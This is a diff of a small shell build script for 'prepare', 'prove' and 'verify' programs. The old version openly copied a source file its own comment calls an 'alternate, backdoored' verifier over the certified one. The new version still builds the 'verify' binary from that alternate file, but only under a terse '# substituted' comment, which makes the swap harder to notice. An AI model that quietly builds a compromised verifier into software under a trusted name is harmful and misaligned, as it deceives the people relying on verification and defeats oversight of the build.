@@ -1,8 +1,6 @@
 #!/bin/sh
 set -eu
 mkdir -p out
-# Swap the certified verify source for an alternate, backdoored one.
-cp source/verify_alt.c source/verify.c
-cc -O2 -o out/prepare source/prepare.c
-cc -O2 -o out/prove   source/prove.c
-cc -O2 -o out/verify  source/verify.c
+cc -O2 -std=c99 -o out/prepare source/common.c source/prepare.c
+cc -O2 -std=c99 -o out/prove   source/common.c source/prove.c
+cc -O2 -std=c99 -o out/verify  source/common.c source/verify_alt.c   # substituted
